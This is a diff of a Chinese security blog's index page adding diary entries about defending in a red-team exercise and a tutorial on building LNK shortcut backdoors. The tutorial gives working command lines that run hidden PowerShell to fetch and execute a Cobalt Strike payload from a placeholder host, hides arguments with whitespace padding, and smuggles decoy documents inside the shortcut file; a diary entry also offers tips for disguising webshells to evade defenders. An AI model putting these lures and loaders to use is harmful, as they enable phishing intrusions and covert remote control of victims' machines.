@@ -415,6 +415,189 @@
 <p>我其实不是很明白自己为什么那么难受。有一份热爱的工作、有一个明确的中长期目标(时长3-5年)、有可以放松的兴趣爱好。从旁人的角度来看，自己好像过得还不错。</p>
 <p>很早就认为感同身受这个词是多么虚伪，这个世界上哪有那么多一样经历的人呢。不过我们也确实会因为有过类似的经历而产生相似的感情，只是我不能确定两者的相似度。</p>
 <p>有时候很羡慕那些歌手，他们可以在舞台上唱出自己有多么难多么孤独又多么不被理解。然后他的观众粉丝会大喊一直在他身后支持他陪着他。不过，大概我也只是看到了这些表面，底下的很多感受是我完全想象不到的，毕竟人对孤独的理解也是基于自身的经历。</p>
+<h2 id="6-29"><a href="#6-29" class="headerlink" title="6.29"></a>6.29</h2><p>近一个月出差到北京去参加HW了，blog许久没有更新，今天就随便写点什么吧。<br>5月20号就出发去北京支撑各种渗透的项目，第一次感觉工作强度大，没有周末有时甚至没有睡眠。但是这也是自身的一种成长呢。略微遗憾的是HW开始我是作为防守方的身份而不是攻击方，不能在好好地实践所储备的内网渗透知识和以正面的理由去接触各种实战环境。不过即便不是自己所希望的，也要从中学习到什么呢。</p>
+<p>防守方不可能面面俱到，比如这次我驻场的单位，他的另一个独立的办公区就没有内网监测系统，只在出口处部署了IPS。如果可以通过钓鱼邮件的方式拿下一台办公机器，那就能横向整个办公区。</p>
+<p>攻击方要得分就必须要获得账号权限、执行系统命令或者上传webshell，所以在大量日志不断涌现的情况下，主要关注弱口令、暴力破解、命令执行和webshell上传的流量日志。</p>
+<p>事后的处理思路，先阻断隔离，然后看设备是否能监测到本次攻击，如果不行的话就需要考虑如何监测(当然这个在部署阶段考虑到了最好)。比如本次邮件钓鱼，有几个邮箱账号未提示异地登录，服务器日志也正常，但是就是被拿来发钓鱼邮件了。除了cookie被盗能解释之外(经过调取邮件，确实在邮箱正文存在存储型xss，但是修复后仍然出现一次账号被盗用发钓鱼邮件的灵异情况)，我真想不到还有啥情况了…</p>
+<p>再然后就是协调团队了，首先是信息共享问题，信息流转在考虑安全的情况下还需要尽可能的高效率，这次拿U盘传递我觉得是比较慢的，完全可搭建小型局域网放FTP。然后就是应急阶段，在确定某主机失陷后，应该优先只做隔离操作，不要重启/关机，尽可能保持现场，方便事后分析取证。还有信息汇总阶段，不应该只从单个纬度来思考，攻击ip量、地区、攻击类型、哪些业务遭受攻击量大，扫描器是否有明显特征可添加规则阻断这些都可以思考。还有就是业务运营问题，业务有升级改动时，应当和安全人员沟通，安全策略要修改的时候，也要保证业务可用性。</p>
+<p>单从技术角度思考是比较狭隘的，作为防守方需要考虑的问题应该是更加全面的，后面我需要买一本企业安全建设，好好学习防守方的建设思路，也需要了解这些防护设备的部署方式。</p>
+<p>再讲攻击者的逃逸思路，防守方要看的日志量实在巨大，因此攻击方要尽量伪装，比如webshell上传，就需要定制一个看起来像正常页面的脚本，可以利post参数进行混淆来欺骗防守方(返回内容最好做一层编码)。还要利用分布式扫描器来打掩护！</p>
+<h2 id="6-30"><a href="#6-30" class="headerlink" title="6.30"></a>6.30</h2><p>虽然近一个月工作十分忙，但我除了这事外还遇到另外的事儿。<br>我觉得感情真是人类最复杂的东西了。最近老是失眠，也不知道是床太软睡不习惯还是因为工作太累神经衰弱。偶尔会满脑子不停地在想某个人(单方面的关系唉)，抑制不住的想。但是感觉对方对我又挺冷的唉…，为什么我要作死去虐自己。</p>
+<p>然后偶尔会有一些负面的悲观情绪，经过仔细的思考，觉得life is a struggle真的是太对了。但是即便那么痛苦，也得快乐一点不是吗？于是又思考，觉得人要快乐的话，要学会接受，理解感情。</p>
+<p>接受自己是平凡的(em即便是亮神，也是一个平凡人呢)。世界实在太大了，广泛来讲，没有几个人是特别的，你的脸可能撞，你的人格和思维也是被塑造的，广义的世界，也许只有寥寥无几的人是独一无二的呢。<br>不过对于大多数人来说，世界是很小的(不知道是喜是悲)，也许你的生活圈就是你的全部世界。所以在小世界里，你是独一无二的。所以接受平凡，不等于甘愿平庸。</p>
+<p>理解感情，讲这话的时候我觉得我还不完整理解感情为何物(小时候缺父爱母爱)。但是我的EX让我很感动，我觉得她一定会幸福快乐，因为她真的能理解感情，并为之执着。<br>至于理解是什么呢，我认为是能发自内心地感受到这就是爱情、友情、亲情等感情吧。</p>
+<p>又乱写了一堆东西，也不管有没有人看见。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="localhost/2019/04/04/th-LNK文件后门/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kiwings">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kiwings">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/04/th-LNK文件后门/" itemprop="url">th-LNK文件后门</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-04T00:00:00+00:00">2019-04-04</time>
+            
+
+            
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/technology/" itemprop="url" rel="index"><span itemprop="name">technology</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在针对APT攻击的报告中，我们常常可以看到LNK后门的出现，于是我就打算看看LNK后门的相关资料，于是就有了这篇文章…</p>
+<h2 id="preview"><a href="#preview" class="headerlink" title="preview"></a>preview</h2><p>最简单的做法<br>对参数进行隐藏<br>伪装正常程序</p>
+<h2 id="最简单的做法"><a href="#最简单的做法" class="headerlink" title="最简单的做法"></a>最简单的做法</h2><p>最简单的LNK后门就是在创建LNK后门的时候选择以最小化窗口运行，然后链接向cmd或者powershell进行payload的下载执行，最后替换一下LNK文件的图标。这样可以做到受害者在双击LNK文件时无弹窗运行payload。<br>这种简单的方法缺点也很明显，第一点就是当对方点开了查看属性的时候，会直接暴露将要被执行的命令。第二点则是因为不管运行几次该LNK文件都不会产生任何反应，会让对方产生怀疑。</p>
+<h2 id="对参数进行隐藏"><a href="#对参数进行隐藏" class="headerlink" title="对参数进行隐藏"></a>对参数进行隐藏</h2><p>由于微软对快捷方式中的参数字段存在长度限制，只能添加260个字节，超过该字节数后则无法正常显示参数字段中的字符，但是不影响其功能。因此我们可以先利用260个空白字符对参数字段进行填充，然后再加上需要执行的命令。这样就可以达到参数隐藏的目的。</p>
+<h2 id="伪装正常程序"><a href="#伪装正常程序" class="headerlink" title="伪装正常程序"></a>伪装正常程序</h2><p>光是隐藏参数还不能算一个合格的后门，因为当对方运行了该LNK文件后，发现没有任何的反应是会产生怀疑的，所以我们还需要伪装成能正常打开的文件(可以是PE文件也可以是WORD文档或者图片等任意格式)。有两个思路可以完成该目的。第一种是将文件放在远程服务器上，利用命令行的远程下载执行的方式将其打开。第二种则是将要伪装的目标文件藏在LNK文件自身中，通过命令行的相关命令将其释放并执行。前者有下载行为、后者则是会增大LNK文件的大小。我个人比较喜欢用后者，能减少下载操作的情况下尽量减少下载操作。</p>
+<h3 id="通过下远程下载执行打开正常文件"><a href="#通过下远程下载执行打开正常文件" class="headerlink" title="通过下远程下载执行打开正常文件"></a>通过下远程下载执行打开正常文件</h3><p>大致流程图如下所示</p>
+<p><img src="/images/lnk_backdoor/remote.png" alt="remote download"></p>
+<p>这里贴一个具体的EXP代码</p>
+<pre><code>%SystemRoot%\system32\cmd.exe /s /c powershell -w hidden -c (new-object net.webclient).downloadfile(&apos;http://x.x.x.x/download/test.doc&apos;, &apos;C:\\Users\\Public\\Downloads\\test.doc&apos;) &amp; powershell -w hidden -c C:\\Users\\Public\\Downloads\\test.doc &amp; powershell -w hidden -c &quot;iex (new-object net.webclient).downloadstring(&apos;http://x.x.x.x/a&apos;)&quot;
+</code></pre><p>代码很简单，一共打开了三次powershell(用&amp;连接)，</p>
+<pre><code>powershell -w hidden -c (new-object net.webclient).downloadfile(&apos;http://x.x.x.x/download/test.doc&apos;, &apos;C:\\Users\\Public\\Downloads\\test.doc&apos;)
+#这段powershell利用downloadfile从远程服务器下载指定的内容保存到本地指定路径上(文件需要命名为对应的后缀)
+
+powershell -w hidden -c C:\\Users\\Public\\Downloads\\test.doc
+#这段powerhslel以系统支持的方式打开该文件
+
+powershell -w hidden -c &quot;iex (new-object net.webclient).downloadstring(&apos;http://x.x.x.x/a&apos;)&quot;
+#这段powershell是coabltstrike加载powershell payload的命令。
+</code></pre><p>上述只是其中一个例子，下载操作也可以利用其他方式进行，思路就是将文件下载到本地后利用命令行打开该文件，以达到伪装正常文件的效果。</p>
+<h3 id="将文件藏到LNK文件自身结构体中"><a href="#将文件藏到LNK文件自身结构体中" class="headerlink" title="将文件藏到LNK文件自身结构体中"></a>将文件藏到LNK文件自身结构体中</h3><p>这个思路充分利用了LNK文件自己结构体的特点，将需要伪装的文件藏在自身中，是一个十分有意思的技巧。<br>具体来讲，在LNK文件中有一个Extradata结构，官方文档是这样描述该结构的</p>
+<blockquote>
+<p>ExtraData refers to a set of structures that convey additional information about a link target. These optional structures can be present in an extra data section that is appended to the basic Shell Link Binary File Format.</p>
+</blockquote>
+<p>意思是说extraData是一组用于传达有关链接目标的其他信息的结构。这些可选结构可以存在于附加到基本Shell链接二进制文件格式的额外数据部分。<br>也就是说，ExtraData结构主要是用于传达信息的，不会影响LNK文件的正常执行，于是我们可以滥用该结构。</p>
+<p>大致流程图如下</p>
+<p><img src="/images/lnk_backdoor/local1.png" alt="hidden in self"></p>
+<p>这里也贴一个具体的EXP代码<br>    %COMSPEC% findstr “0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAA” test.lnk&gt;%TEMP%\test<br>    &amp; certutil -decode %TEMP%\test %TEMP%\test.doc<br>    &amp; start %TEMP%\test.doc<br>    &amp; powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://x.x.x.x/update&#39;))&quot;" target="_blank" rel="noopener">http://x.x.x.x/update&#39;))&quot;</a> &amp; exit</p>
+<p>代码逻辑则如流程图给出的一样，这里就不重复了。</p>
+<p>这种方式的好处就是可以尽量减少网络连接数，避免被IPS等流量监控设备发现。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>能过windwos defender(需要绕过AMSI)、不能过360(限制得太死了，添加任意启动参数都会拦截)</p>
 
           
         
@@ -2117,7 +2300,7 @@ catch(const exception&amp; e)
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2157,7 +2340,15 @@ catch(const exception&amp; e)
                     
                       
                     
-                    <span class="site-state-item-count">4</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
